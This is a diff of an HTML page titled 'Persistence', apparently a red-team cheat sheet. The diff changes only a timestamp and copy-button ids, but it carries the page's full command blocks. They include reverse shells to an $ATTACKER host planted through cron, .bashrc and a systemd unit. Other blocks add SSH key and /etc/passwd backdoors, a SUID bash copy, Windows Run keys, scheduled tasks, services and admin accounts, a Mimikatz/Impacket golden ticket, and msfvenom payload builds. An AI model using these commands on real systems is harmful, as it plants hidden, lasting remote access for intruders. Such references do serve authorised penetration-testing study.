@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:13 -->
+<!-- 2026-07-30 Thu 22:23 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Persistence</title>
@@ -939,11 +939,11 @@ needed, hard to detect without auditing authorised<sub>keys</sub> files.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_31c2d281add74392a4b073efafb952d7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3f578745efc647ea88126e15e2527f9a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_31c2d281add74392a4b073efafb952d7=document.querySelector('button[name=btn_31c2d281add74392a4b073efafb952d7]');
-copyBtnbtn_31c2d281add74392a4b073efafb952d7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Generate key pair on attacker\nssh-keygen -t rsa -b 4096 -f backdoor -N \"\"\n\n# Add public key to target\necho \"$(cat backdoor.pub)\" >> /home/user/.ssh/authorized_keys\n# or for root\necho \"$(cat backdoor.pub)\" >> /root/.ssh/authorized_keys\n\n# Connect back\nssh -i backdoor user@$TARGET\n`);copyBtnbtn_31c2d281add74392a4b073efafb952d7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_31c2d281add74392a4b073efafb952d7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3f578745efc647ea88126e15e2527f9a=document.querySelector('button[name=btn_3f578745efc647ea88126e15e2527f9a]');
+copyBtnbtn_3f578745efc647ea88126e15e2527f9a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate key pair on attacker\nssh-keygen -t rsa -b 4096 -f backdoor -N \"\"\n\n# Add public key to target\necho \"$(cat backdoor.pub)\" >> /home/user/.ssh/authorized_keys\n# or for root\necho \"$(cat backdoor.pub)\" >> /root/.ssh/authorized_keys\n\n# Connect back\nssh -i backdoor user@$TARGET\n`);copyBtnbtn_3f578745efc647ea88126e15e2527f9a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3f578745efc647ea88126e15e2527f9a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -965,11 +965,11 @@ let res = copyTextToClipboard(`# Generate key pair on attacker\nssh-keygen -t rs
 <h3 id="org1c61baa">Cron Job</h3>
 <div class="outline-text-3" id="text-org1c61baa">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1e27cc9be26b48e58076e4db309b95bf>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fee72c07665d4262a6010c8a40d0d41d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1e27cc9be26b48e58076e4db309b95bf=document.querySelector('button[name=btn_1e27cc9be26b48e58076e4db309b95bf]');
-copyBtnbtn_1e27cc9be26b48e58076e4db309b95bf.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Add reverse shell to crontab — runs every minute\n(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\") | crontab -\n\n# System-wide cron (requires root)\necho \"* * * * * root bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\" >> /etc/crontab\n\n# Drop script in cron directory\necho '#!/bin/bash' > /etc/cron.d/backdoor\necho \"* * * * * root /tmp/.backdoor\" >> /etc/cron.d/backdoor\n`);copyBtnbtn_1e27cc9be26b48e58076e4db309b95bf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1e27cc9be26b48e58076e4db309b95bf.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fee72c07665d4262a6010c8a40d0d41d=document.querySelector('button[name=btn_fee72c07665d4262a6010c8a40d0d41d]');
+copyBtnbtn_fee72c07665d4262a6010c8a40d0d41d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Add reverse shell to crontab — runs every minute\n(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\") | crontab -\n\n# System-wide cron (requires root)\necho \"* * * * * root bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\" >> /etc/crontab\n\n# Drop script in cron directory\necho '#!/bin/bash' > /etc/cron.d/backdoor\necho \"* * * * * root /tmp/.backdoor\" >> /etc/cron.d/backdoor\n`);copyBtnbtn_fee72c07665d4262a6010c8a40d0d41d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fee72c07665d4262a6010c8a40d0d41d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -990,11 +990,11 @@ let res = copyTextToClipboard(`# Add reverse shell to crontab — runs every min
 <h3 id="orga544371">SUID Backdoor (requires root)</h3>
 <div class="outline-text-3" id="text-orga544371">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3485c41bb10e4bbaa45bbe7687fb5dc8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_53b5555342c14f978a04305937c720f2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3485c41bb10e4bbaa45bbe7687fb5dc8=document.querySelector('button[name=btn_3485c41bb10e4bbaa45bbe7687fb5dc8]');
-copyBtnbtn_3485c41bb10e4bbaa45bbe7687fb5dc8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Copy bash and set SUID — accessible by any user\ncp /bin/bash /tmp/.bash\nchmod +s /tmp/.bash\n\n# Execute\n/tmp/.bash -p    # -p preserves EUID (root)\n`);copyBtnbtn_3485c41bb10e4bbaa45bbe7687fb5dc8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3485c41bb10e4bbaa45bbe7687fb5dc8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_53b5555342c14f978a04305937c720f2=document.querySelector('button[name=btn_53b5555342c14f978a04305937c720f2]');
+copyBtnbtn_53b5555342c14f978a04305937c720f2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Copy bash and set SUID — accessible by any user\ncp /bin/bash /tmp/.bash\nchmod +s /tmp/.bash\n\n# Execute\n/tmp/.bash -p    # -p preserves EUID (root)\n`);copyBtnbtn_53b5555342c14f978a04305937c720f2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_53b5555342c14f978a04305937c720f2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1012,11 +1012,11 @@ chmod +s /tmp/.bash
 <h3 id="orgad51250">Bash RC / Profile</h3>
 <div class="outline-text-3" id="text-orgad51250">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_91c703b82b734250b8e0dd698eb7a575>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bc8a325a4ba94c76b265109d418fac28>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_91c703b82b734250b8e0dd698eb7a575=document.querySelector('button[name=btn_91c703b82b734250b8e0dd698eb7a575]');
-copyBtnbtn_91c703b82b734250b8e0dd698eb7a575.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Fires when target user opens a new shell\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bashrc\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bash_profile\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /etc/profile  # all users, needs root\n`);copyBtnbtn_91c703b82b734250b8e0dd698eb7a575.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_91c703b82b734250b8e0dd698eb7a575.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_bc8a325a4ba94c76b265109d418fac28=document.querySelector('button[name=btn_bc8a325a4ba94c76b265109d418fac28]');
+copyBtnbtn_bc8a325a4ba94c76b265109d418fac28.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Fires when target user opens a new shell\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bashrc\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bash_profile\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /etc/profile  # all users, needs root\n`);copyBtnbtn_bc8a325a4ba94c76b265109d418fac28.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bc8a325a4ba94c76b265109d418fac28.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1032,11 +1032,11 @@ let res = copyTextToClipboard(`# Fires when target user opens a new shell\necho 
 <h3 id="org5522b31">Systemd Service (requires root)</h3>
 <div class="outline-text-3" id="text-org5522b31">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7c2ed0a0fb41445582c7c962130a94fa>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_73ad347536e14262a7d4109106a92a52>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7c2ed0a0fb41445582c7c962130a94fa=document.querySelector('button[name=btn_7c2ed0a0fb41445582c7c962130a94fa]');
-copyBtnbtn_7c2ed0a0fb41445582c7c962130a94fa.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl enable backdoor.service\nsystemctl start backdoor.service\n`);copyBtnbtn_7c2ed0a0fb41445582c7c962130a94fa.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7c2ed0a0fb41445582c7c962130a94fa.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_73ad347536e14262a7d4109106a92a52=document.querySelector('button[name=btn_73ad347536e14262a7d4109106a92a52]');
+copyBtnbtn_73ad347536e14262a7d4109106a92a52.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl enable backdoor.service\nsystemctl start backdoor.service\n`);copyBtnbtn_73ad347536e14262a7d4109106a92a52.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_73ad347536e14262a7d4109106a92a52.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1063,11 +1063,11 @@ systemctl start backdoor.service
 <h3 id="orga152ce3">/etc/passwd Backdoor</h3>
 <div class="outline-text-3" id="text-orga152ce3">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e17ff8fabd04495d88cbb87d8592d81e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_403d3d9c23c0467894579fff6542c28a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e17ff8fabd04495d88cbb87d8592d81e=document.querySelector('button[name=btn_e17ff8fabd04495d88cbb87d8592d81e]');
-copyBtnbtn_e17ff8fabd04495d88cbb87d8592d81e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Add new root-equivalent user with known password\nopenssl passwd -1 -salt xyz backdoor123\n\necho 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n\nsu backdoor\n`);copyBtnbtn_e17ff8fabd04495d88cbb87d8592d81e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e17ff8fabd04495d88cbb87d8592d81e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_403d3d9c23c0467894579fff6542c28a=document.querySelector('button[name=btn_403d3d9c23c0467894579fff6542c28a]');
+copyBtnbtn_403d3d9c23c0467894579fff6542c28a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Add new root-equivalent user with known password\nopenssl passwd -1 -salt xyz backdoor123\n\necho 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n\nsu backdoor\n`);copyBtnbtn_403d3d9c23c0467894579fff6542c28a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_403d3d9c23c0467894579fff6542c28a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1094,11 +1094,11 @@ Execute payload on every user login:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_dcd6fcf30abe4d42a4d9d729df83b098>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2c31211a153347dc9937453b8b32407a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_dcd6fcf30abe4d42a4d9d729df83b098=document.querySelector('button[name=btn_dcd6fcf30abe4d42a4d9d729df83b098]');
-copyBtnbtn_dcd6fcf30abe4d42a4d9d729df83b098.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Current user\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n\n# All users (requires admin)\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n`);copyBtnbtn_dcd6fcf30abe4d42a4d9d729df83b098.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dcd6fcf30abe4d42a4d9d729df83b098.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2c31211a153347dc9937453b8b32407a=document.querySelector('button[name=btn_2c31211a153347dc9937453b8b32407a]');
+copyBtnbtn_2c31211a153347dc9937453b8b32407a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Current user\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n\n# All users (requires admin)\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n`);copyBtnbtn_2c31211a153347dc9937453b8b32407a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2c31211a153347dc9937453b8b32407a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1119,11 +1119,11 @@ let res = copyTextToClipboard(`# Current user\nreg add HKCU\\Software\\Microsoft
 <h3 id="org4f3f164">Scheduled Task</h3>
 <div class="outline-text-3" id="text-org4f3f164">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2ea08d670ed94faab6bc33e11c13e6ef>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f904c14384084143bea9b9cbf414be54>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2ea08d670ed94faab6bc33e11c13e6ef=document.querySelector('button[name=btn_2ea08d670ed94faab6bc33e11c13e6ef]');
-copyBtnbtn_2ea08d670ed94faab6bc33e11c13e6ef.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Run at logon — current user\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc onlogon /ru %USERNAME% /f\n\n# Run every minute — requires admin for SYSTEM\nschtasks /create /tn \"SystemHealth\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc minute /mo 1 /ru SYSTEM /f\n\n# Verify\nschtasks /query /tn \"WindowsUpdate\"\n\n# Remove\nschtasks /delete /tn \"WindowsUpdate\" /f\n`);copyBtnbtn_2ea08d670ed94faab6bc33e11c13e6ef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2ea08d670ed94faab6bc33e11c13e6ef.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f904c14384084143bea9b9cbf414be54=document.querySelector('button[name=btn_f904c14384084143bea9b9cbf414be54]');
+copyBtnbtn_f904c14384084143bea9b9cbf414be54.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Run at logon — current user\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc onlogon /ru %USERNAME% /f\n\n# Run every minute — requires admin for SYSTEM\nschtasks /create /tn \"SystemHealth\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc minute /mo 1 /ru SYSTEM /f\n\n# Verify\nschtasks /query /tn \"WindowsUpdate\"\n\n# Remove\nschtasks /delete /tn \"WindowsUpdate\" /f\n`);copyBtnbtn_f904c14384084143bea9b9cbf414be54.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f904c14384084143bea9b9cbf414be54.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1148,11 +1148,11 @@ let res = copyTextToClipboard(`# Run at logon — current user\nschtasks /create
 <h3 id="orgca6dcf3">New Local Admin User</h3>
 <div class="outline-text-3" id="text-orgca6dcf3">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a2077d3de6aa4d5ea0857b68154b6690>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d0f372ea25204879b68745089608bd34>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a2077d3de6aa4d5ea0857b68154b6690=document.querySelector('button[name=btn_a2077d3de6aa4d5ea0857b68154b6690]');
-copyBtnbtn_a2077d3de6aa4d5ea0857b68154b6690.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`net user backdoor Password123! /add\nnet localgroup administrators backdoor /add\n\n# Verify\nnet user backdoor\n`);copyBtnbtn_a2077d3de6aa4d5ea0857b68154b6690.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a2077d3de6aa4d5ea0857b68154b6690.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d0f372ea25204879b68745089608bd34=document.querySelector('button[name=btn_d0f372ea25204879b68745089608bd34]');
+copyBtnbtn_d0f372ea25204879b68745089608bd34.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`net user backdoor Password123! /add\nnet localgroup administrators backdoor /add\n\n# Verify\nnet user backdoor\n`);copyBtnbtn_d0f372ea25204879b68745089608bd34.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d0f372ea25204879b68745089608bd34.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1169,11 +1169,11 @@ net localgroup administrators backdoor /add
 <h3 id="org785d741">Windows Service</h3>
 <div class="outline-text-3" id="text-org785d741">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fc089f3c31dc43128ec65ea7a0058ea5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f7d45e1d2d714d82bbd8766fca69e20b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_fc089f3c31dc43128ec65ea7a0058ea5=document.querySelector('button[name=btn_fc089f3c31dc43128ec65ea7a0058ea5]');
-copyBtnbtn_fc089f3c31dc43128ec65ea7a0058ea5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Create service running payload as SYSTEM\nsc create \"WindowsUpdate\" binpath= \"C:\\Windows\\Temp\\shell.exe\" \\\n  start= auto obj= \"LocalSystem\"\n\nsc start \"WindowsUpdate\"\n\n# Cleanup\nsc stop \"WindowsUpdate\"\nsc delete \"WindowsUpdate\"\n`);copyBtnbtn_fc089f3c31dc43128ec65ea7a0058ea5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fc089f3c31dc43128ec65ea7a0058ea5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f7d45e1d2d714d82bbd8766fca69e20b=document.querySelector('button[name=btn_f7d45e1d2d714d82bbd8766fca69e20b]');
+copyBtnbtn_f7d45e1d2d714d82bbd8766fca69e20b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Create service running payload as SYSTEM\nsc create \"WindowsUpdate\" binpath= \"C:\\Windows\\Temp\\shell.exe\" \\\n  start= auto obj= \"LocalSystem\"\n\nsc start \"WindowsUpdate\"\n\n# Cleanup\nsc stop \"WindowsUpdate\"\nsc delete \"WindowsUpdate\"\n`);copyBtnbtn_f7d45e1d2d714d82bbd8766fca69e20b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f7d45e1d2d714d82bbd8766fca69e20b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1194,11 +1194,11 @@ sc delete <span style="color: var(--clr-string); background-color: var(--bg-stri
 <h3 id="org630624f">Startup Folder</h3>
 <div class="outline-text-3" id="text-org630624f">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9c258920ec2d4891a153cc063650f661>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_eacf4dc298fc40108a216afee8fecdc3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_9c258920ec2d4891a153cc063650f661=document.querySelector('button[name=btn_9c258920ec2d4891a153cc063650f661]');
-copyBtnbtn_9c258920ec2d4891a153cc063650f661.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Current user\ncopy shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n# All users (requires admin)\ncopy shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n`);copyBtnbtn_9c258920ec2d4891a153cc063650f661.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9c258920ec2d4891a153cc063650f661.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_eacf4dc298fc40108a216afee8fecdc3=document.querySelector('button[name=btn_eacf4dc298fc40108a216afee8fecdc3]');
+copyBtnbtn_eacf4dc298fc40108a216afee8fecdc3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Current user\ncopy shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n# All users (requires admin)\ncopy shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n`);copyBtnbtn_eacf4dc298fc40108a216afee8fecdc3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eacf4dc298fc40108a216afee8fecdc3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1221,11 +1221,11 @@ password resets unless KRBTGT is rotated twice.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_33ea67f167a14f12b8cd5023f5f9e886>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_47598e234e774db1b5ecc0f6efaf5ecb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_33ea67f167a14f12b8cd5023f5f9e886=document.querySelector('button[name=btn_33ea67f167a14f12b8cd5023f5f9e886]');
-copyBtnbtn_33ea67f167a14f12b8cd5023f5f9e886.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Mimikatz\nkerberos::golden /user:Administrator /domain:domain.local \\\n  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500\n\n# Use ticket\nkerberos::ptt ticket.kirbi\n\n# Or Impacket from Linux\nimpacket-ticketer -nthash KRBTGT_HASH \\\n  -domain-sid S-1-5-21-... \\\n  -domain domain.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass domain.local/Administrator@$DC\n`);copyBtnbtn_33ea67f167a14f12b8cd5023f5f9e886.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_33ea67f167a14f12b8cd5023f5f9e886.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_47598e234e774db1b5ecc0f6efaf5ecb=document.querySelector('button[name=btn_47598e234e774db1b5ecc0f6efaf5ecb]');
+copyBtnbtn_47598e234e774db1b5ecc0f6efaf5ecb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Mimikatz\nkerberos::golden /user:Administrator /domain:domain.local \\\n  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500\n\n# Use ticket\nkerberos::ptt ticket.kirbi\n\n# Or Impacket from Linux\nimpacket-ticketer -nthash KRBTGT_HASH \\\n  -domain-sid S-1-5-21-... \\\n  -domain domain.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass domain.local/Administrator@$DC\n`);copyBtnbtn_47598e234e774db1b5ecc0f6efaf5ecb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_47598e234e774db1b5ecc0f6efaf5ecb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1251,11 +1251,11 @@ impacket-psexec -k -no-pass domain.local/Administrator@$<span style="color: var(
 <h2 id="org9429dfd">3. Payload Generation</h2>
 <div class="outline-text-2" id="text-org9429dfd">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_914352be19734bfda9b8547d25eb2b29>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_39ba84e1181b4a209df7f16045a295e8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_914352be19734bfda9b8547d25eb2b29=document.querySelector('button[name=btn_914352be19734bfda9b8547d25eb2b29]');
-copyBtnbtn_914352be19734bfda9b8547d25eb2b29.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Windows reverse shell EXE\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# With staged Meterpreter for more features\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\nchmod +x shell.elf\n`);copyBtnbtn_914352be19734bfda9b8547d25eb2b29.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_914352be19734bfda9b8547d25eb2b29.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_39ba84e1181b4a209df7f16045a295e8=document.querySelector('button[name=btn_39ba84e1181b4a209df7f16045a295e8]');
+copyBtnbtn_39ba84e1181b4a209df7f16045a295e8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Windows reverse shell EXE\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# With staged Meterpreter for more features\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\nchmod +x shell.elf\n`);copyBtnbtn_39ba84e1181b4a209df7f16045a295e8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_39ba84e1181b4a209df7f16045a295e8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
